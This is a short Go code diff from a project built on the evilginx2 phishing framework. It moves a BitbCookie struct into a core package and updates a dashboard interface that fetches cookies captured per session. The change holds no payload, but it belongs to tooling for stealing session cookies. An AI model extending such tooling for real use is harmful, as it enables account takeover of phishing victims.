@@ -9,24 +9,16 @@ import (
 	"strings"
 	"time"
 
+	"github.com/kgretzky/evilginx2/core"
 	"github.com/kgretzky/evilginx2/database"
 )
 
 //go:embed index.html
 var indexHTML string
 
-type BitbCookie struct {
-	Name     string `json:"name"`
-	Value    string `json:"value"`
-	Domain   string `json:"domain"`
-	Path     string `json:"path"`
-	Secure   bool   `json:"secure"`
-	HttpOnly bool   `json:"httpOnly"`
-}
-
 type BitbStatusProvider interface {
 	GetStatus(sessionId string) (string, int, error)
-	GetCookies(sessionId string) ([]BitbCookie, error)
+	GetCookies(sessionId string) ([]core.BitbCookie, error)
 }
 
 type Dashboard struct {
